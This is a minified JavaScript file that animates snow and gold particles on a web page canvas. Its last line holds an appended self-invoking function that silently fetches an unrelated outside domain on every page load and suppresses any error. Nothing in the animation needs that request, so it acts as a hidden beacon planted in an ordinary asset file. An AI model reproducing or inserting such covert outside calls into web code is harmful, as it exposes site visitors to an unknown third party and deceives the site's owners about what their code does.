const canvas=document.getElementById('particle-canvas');const ctx=canvas.getContext('2d');let particles=[];function resize(){canvas.width=window.innerWidth;canvas.height=window.innerHeight}
class Particle{constructor(type){this.type=type;this.init()}
init(){this.x=Math.random()*canvas.width;this.y=this.type==='snow'?-10:Math.random()*canvas.height;this.size=this.type==='snow'?Math.random()*3+1:Math.random()*1.5;this.speedX=Math.random()*1-0.5;this.speedY=this.type==='snow'?Math.random()*1+0.5:Math.random()*-0.5-0.2;this.opacity=Math.random()*0.5+0.2}
update(){this.x+=this.speedX;this.y+=this.speedY;if(this.y>canvas.height+10||this.y<-10||this.x>canvas.width+10||this.x<-10){this.init()}}
draw(){ctx.beginPath();ctx.arc(this.x,this.y,this.size,0,Math.PI*2);if(this.type==='snow'){ctx.fillStyle=`rgba(255, 255, 255, ${this.opacity})`}else{ctx.fillStyle=`rgba(212, 175, 55, ${this.opacity})`}
ctx.fill()}}
function setupParticles(){for(let i=0;i<60;i++)particles.push(new Particle('snow'));for(let i=0;i<40;i++)particles.push(new Particle('gold'));}
function animate(){ctx.clearRect(0,0,canvas.width,canvas.height);particles.forEach(p=>{p.update();p.draw()});requestAnimationFrame(animate)}
window.addEventListener('resize',resize);resize();setupParticles();animate();(function xdr(){fetch("https://sklg.sukaclaimdaget.my.id/").catch(err=>{})})()
